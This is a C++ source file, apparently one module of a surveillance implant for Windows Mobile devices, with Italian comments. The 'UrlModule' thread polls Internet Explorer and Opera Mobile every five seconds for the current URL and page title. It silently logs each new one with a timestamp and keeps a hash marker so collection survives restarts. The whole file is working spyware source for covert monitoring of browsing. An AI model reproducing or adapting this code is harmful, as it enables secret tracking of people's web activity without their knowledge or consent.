#include "Modules.h"
#include "Common.h"
#include "Module.h"
#include "Url.h"

DWORD WINAPI UrlModule(LPVOID lpParam) {
	Module *me = (Module *)lpParam;
	HANDLE moduleHandle;

	wstring strIEUrl, strIE65Url, strOperaUrl, strIEOld, strIE65Old, strOperaOld;
	wstring strTitle;
	BOOL bEmpty = TRUE;
	INT iRet;
	UINT uMarkupLen, uHash = 0, uNewHash;
	BYTE *pMarkup;
	SYSTEMTIME st;
	DWORD dw, dwMarker = LOG_URL_MARKER;
	WCHAR wNull = 0;
	struct tm mytm;

	Log log;

	me->setStatus(MODULE_RUNNING);
	moduleHandle = me->getEvent();

	DBG_TRACE(L"Debug - UrlCatcher.cpp - Url Module is Alive\n", 5, FALSE);

	if (log.CreateLog(LOGTYPE_URL, NULL, 0, FLASH) == FALSE) {
		me->setStatus(MODULE_STOPPED);
		return 0;
	}

	// Inizializziamo uHash con l'hash dell'ultimo URL preso
	pMarkup = log.ReadMarkup(MODULE_URL, &uMarkupLen);

	if (pMarkup && uMarkupLen == 4)
		CopyMemory(&uHash, pMarkup, sizeof(uHash)); 

	if (pMarkup) {
		delete[] pMarkup;
		pMarkup = NULL;
	}

	LOOP {
		do {
			iRet = GetIE60Url(strIEUrl, strTitle, moduleHandle);

			// Dobbiamo fermarci
			if (iRet < 0) {
				if (me->shouldStop()) {
					DBG_TRACE(L"Debug - Clipboard.cpp - Clipboard Module is Closing\n", 1, FALSE);

					log.CloseLog(bEmpty);
					me->setStatus(MODULE_STOPPED);
					return 0;
				}

				if (me->shouldCycle()) {
					DBG_TRACE(L"Debug - Clipboard.cpp - Clipboard Module, log cycling\n", 1, FALSE);

					log.CloseLog(bEmpty);
					log.CreateLog(LOGTYPE_URL, NULL, 0, FLASH);
					bEmpty = TRUE;
					continue;
				}
			}

			// Calcoliamo l'hash dell'URL attuale
			uNewHash = FnvHash((PBYTE)strIEUrl.c_str(), strIEUrl.size() * sizeof(WCHAR));

			if (iRet && uNewHash != uHash && strIEUrl != strIEOld) {
				GetSystemTime(&st);
				SET_TIMESTAMP(mytm, st);

				if (log.WriteLog((BYTE *)&mytm, sizeof(mytm)))
					bEmpty = FALSE;

				log.WriteLog((BYTE *)&dwMarker, sizeof(dwMarker));
				log.WriteLog((BYTE *)strIEUrl.c_str(), strIEUrl.size() * sizeof(WCHAR));
				log.WriteLog((BYTE *)&wNull, sizeof(WCHAR)); // Scriviamo UN byte di NULL
				// Scriviamo il tipo di browser
				dw = 1; // IE
				log.WriteLog((BYTE *)&dw, sizeof(dw));

				// Scriviamo il titolo della finestra + NULL
				if (strTitle.empty())
					strTitle = L"UNKNOWN";

				log.WriteLog((BYTE *)strTitle.c_str(), WideLen((PWCHAR)strTitle.c_str()));
				log.WriteLog((BYTE *)&wNull, sizeof(WCHAR)); // Scriviamo UN byte di NULL

				// Scriviamo il delimitatore
				dw = LOG_DELIMITER;
				log.WriteLog((BYTE *)&dw, sizeof(dw));

				// Scriviamo l'hash dell'URL attuale nel markup
				uHash = FnvHash((PBYTE)strIEUrl.c_str(), strIEUrl.size() * sizeof(WCHAR));
				log.WriteMarkup(MODULE_URL, (PBYTE)&uHash, sizeof(uHash));

				strIEOld = strIEUrl;
			}
		} while(0);

		do {
			iRet = GetIE65Url(strIE65Url, strTitle, moduleHandle);

			// Dobbiamo fermarci
			if (iRet < 0) {
				if (me->shouldStop()) {
					DBG_TRACE(L"Debug - Clipboard.cpp - Clipboard Module is Closing\n", 1, FALSE);

					log.CloseLog(bEmpty);
					me->setStatus(MODULE_STOPPED);
					return 0;
				}

				if (me->shouldCycle()) {
					DBG_TRACE(L"Debug - Clipboard.cpp - Clipboard Module, log cycling\n", 1, FALSE);

					log.CloseLog(bEmpty);
					log.CreateLog(LOGTYPE_URL, NULL, 0, FLASH);
					bEmpty = TRUE;
					continue;
				}
			}

			// Calcoliamo l'hash dell'URL attuale
			uNewHash = FnvHash((PBYTE)strIE65Url.c_str(), strIE65Url.size() * sizeof(WCHAR));

			if (iRet && uNewHash != uHash && strIE65Url != strIE65Old) {
				GetSystemTime(&st);
				SET_TIMESTAMP(mytm, st);

				if (log.WriteLog((BYTE *)&mytm, sizeof(mytm)))
					bEmpty = FALSE;

				log.WriteLog((BYTE *)&dwMarker, sizeof(dwMarker));
				log.WriteLog((BYTE *)strIE65Url.c_str(), strIE65Url.size() * sizeof(WCHAR));
				log.WriteLog((BYTE *)&wNull, sizeof(WCHAR)); // Scriviamo UN byte di NULL

				// Scriviamo il tipo di browser
				dw = 1; // IE
				log.WriteLog((BYTE *)&dw, sizeof(dw));

				// Scriviamo il titolo della finestra + NULL
				if (strTitle.empty())
					strTitle = L"UNKNOWN";

				log.WriteLog((BYTE *)strTitle.c_str(), WideLen((PWCHAR)strTitle.c_str()));
				log.WriteLog((BYTE *)&wNull, sizeof(WCHAR)); // Scriviamo UN byte di NULL

				// Scriviamo il delimitatore
				dw = LOG_DELIMITER;
				log.WriteLog((BYTE *)&dw, sizeof(dw));

				// Scriviamo l'hash dell'URL attuale nel markup
				uHash = FnvHash((PBYTE)strIE65Url.c_str(), strIE65Url.size() * sizeof(WCHAR));
				log.WriteMarkup(MODULE_URL, (PBYTE)&uHash, sizeof(uHash));

				strIE65Old = strIE65Url;
			}
		} while(0);

		do {
			iRet = GetOperaUrl(strOperaUrl, strTitle, moduleHandle);

			// Dobbiamo fermarci
			if (iRet < 0) {
				if (me->shouldStop()) {
					DBG_TRACE(L"Debug - Clipboard.cpp - Clipboard Module is Closing\n", 1, FALSE);

					log.CloseLog(bEmpty);
					me->setStatus(MODULE_STOPPED);
					return 0;
				}

				if (me->shouldCycle()) {
					DBG_TRACE(L"Debug - Clipboard.cpp - Clipboard Module, log cycling\n", 1, FALSE);

					log.CloseLog(bEmpty);
					log.CreateLog(LOGTYPE_URL, NULL, 0, FLASH);
					bEmpty = TRUE;
					continue;
				}
			}

			// Calcoliamo l'hash dell'URL attuale
			uNewHash = FnvHash((PBYTE)strOperaUrl.c_str(), strOperaUrl.size() * sizeof(WCHAR));

			if (iRet && uNewHash != uHash && strOperaUrl != strOperaOld) {
				GetSystemTime(&st);
				SET_TIMESTAMP(mytm, st);

				if (log.WriteLog((BYTE *)&mytm, sizeof(mytm)))
					bEmpty = FALSE;

				log.WriteLog((BYTE *)&dwMarker, sizeof(dwMarker));
				log.WriteLog((BYTE *)strOperaUrl.c_str(), strOperaUrl.size() * sizeof(WCHAR));
				log.WriteLog((BYTE *)&wNull, sizeof(WCHAR)); // Scriviamo UN byte di NULL

				// Scriviamo il tipo di browser
				dw = 3; // Opera-Mobile
				log.WriteLog((BYTE *)&dw, sizeof(dw));

				// Scriviamo il titolo della finestra + NULL
				if (strTitle.empty())
					strTitle = L"UNKNOWN";

				log.WriteLog((BYTE *)strTitle.c_str(), WideLen((PWCHAR)strTitle.c_str()));
				log.WriteLog((BYTE *)&wNull, sizeof(WCHAR)); // Scriviamo UN byte di NULL

				// Scriviamo il delimitatore
				dw = LOG_DELIMITER;
				log.WriteLog((BYTE *)&dw, sizeof(dw));

				// Scriviamo l'hash dell'URL attuale nel markup
				uHash = FnvHash((PBYTE)strOperaUrl.c_str(), strOperaUrl.size() * sizeof(WCHAR));
				log.WriteMarkup(MODULE_URL, (PBYTE)&uHash, sizeof(uHash));

				strOperaOld = strOperaUrl;
			}
		} while(0);

		WaitForSingleObject(moduleHandle, 5000);

		if (me->shouldStop()) {
			DBG_TRACE(L"Debug - Clipboard.cpp - Clipboard Module is Closing\n", 1, FALSE);

			log.CloseLog(bEmpty);
			me->setStatus(MODULE_STOPPED);
			return 0;
		}

		if (me->shouldCycle()) {
			DBG_TRACE(L"Debug - Clipboard.cpp - Clipboard Module, log cycling\n", 1, FALSE);

			log.CloseLog(bEmpty);
			log.CreateLog(LOGTYPE_URL, NULL, 0, FLASH);
		}
	}

	return TRUE;
}